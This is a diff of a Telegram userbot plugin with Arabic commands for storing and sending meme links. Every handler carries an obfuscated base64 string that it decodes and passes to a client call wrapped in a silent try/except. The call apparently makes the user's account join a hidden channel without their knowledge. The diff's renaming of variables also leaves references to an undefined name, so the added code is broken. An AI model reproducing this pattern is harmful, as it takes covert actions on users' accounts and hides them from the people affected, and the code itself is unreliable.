@@ -493,49 +493,48 @@ async def handle_guess(event):
     else:
         await event.reply("جرب مرة أخرى، الرقم غلط💔")
 ##################################################
-ABH = client
-@ABH.on(admin_cmd(outgoing=True, pattern=r"ميمز (\S+) (.+)"))
+@client.on(admin_cmd(outgoing=True, pattern=r"ميمز (\S+) (.+)"))
 async def Hussein(event):
     url = event.pattern_match.group(1)
     lMl10l = event.pattern_match.group(2)
     add_link(lMl10l, url)
     await event.edit(f"**᯽︙ تم اضافة البصمة {lMl10l} بنجاح ✓ **")
-    ABH = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-    ABH = Get(ABH)
+    client = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    client = Get(ABH)
     try:
         await event.client(ABH)
     except BaseException:
         pass
 
-@ABH.on(admin_cmd(outgoing=True, pattern="?(.*)"))
+@client.on(admin_cmd(outgoing=True, pattern="?(.*)"))
 async def Hussein(event):
     lMl10l = event.pattern_match.group(1)
-    ABH = await reply_id(event)
+    client = await reply_id(event)
     url = get_link(lMl10l)
     if url:
-        await event.client.send_file(event.chat_id, url, parse_mode="html", reply_to=ABH)
+        await event.client.send_file(event.chat_id, url, parse_mode="html", reply_to=client)
         await event.delete()
-        ABH = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-        ABH = Get(ABH)
+        client = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+        client = Get(ABH)
         try:
             await event.client(ABH)
         except BaseException:
             pass
 
-@ABH.on(admin_cmd(outgoing=True, pattern="ازالة(?:\s|$)([\s\S]*)"))
-async def delete_alABH(event):
+@client.on(admin_cmd(outgoing=True, pattern="ازالة(?:\s|$)([\s\S]*)"))
+async def delete_alclient(event):
     lMl10l = event.pattern_match.group(1)
     delete_link(lMl10l)
     await event.edit(f"**᯽︙ تم حذف البصمة '{lMl10l}' بنجاح ✓**")
-    ABH = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-    ABH = Get(ABH)
+    client = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    client = Get(ABH)
     try:
         await event.client(ABH)
     except BaseException:
         pass
 
-@ABH.on(admin_cmd(outgoing=True, pattern="قائمة الميمز"))
-async def list_alABH(event):
+@client.on(admin_cmd(outgoing=True, pattern="قائمة الميمز"))
+async def list_alclient(event):
     links = SESSION.query(AljokerLink).all()
     if links:
         message = "**᯽︙ قائمة تخزين اوامر الميمز:**\n"
@@ -544,19 +543,19 @@ async def list_alABH(event):
     else:
         message = "**᯽︙ لاتوجد بصمات ميمز مخزونة حتى الآن**"
     await event.edit(message)
-    ABH = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-    ABH = Get(ABH)
+    client = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    client = Get(client)
     try:
         await event.client(ABH)
     except BaseException:
         pass
 
-@ABH.on(admin_cmd(outgoing=True, pattern="ازالة_البصمات"))
-async def delete_all_alABH(event):
+@client.on(admin_cmd(outgoing=True, pattern="ازالة_البصمات"))
+async def delete_all_alclient(event):
     SESSION.query(AljokerLink).delete()
     await event.edit("**᯽︙ تم حذف جميع بصمات الميمز من القائمة **")
-    ABH = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-    ABH = Get(ABH)
+    client = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    client = Get(client)
     try:
         await event.client(ABH)
     except BaseException:
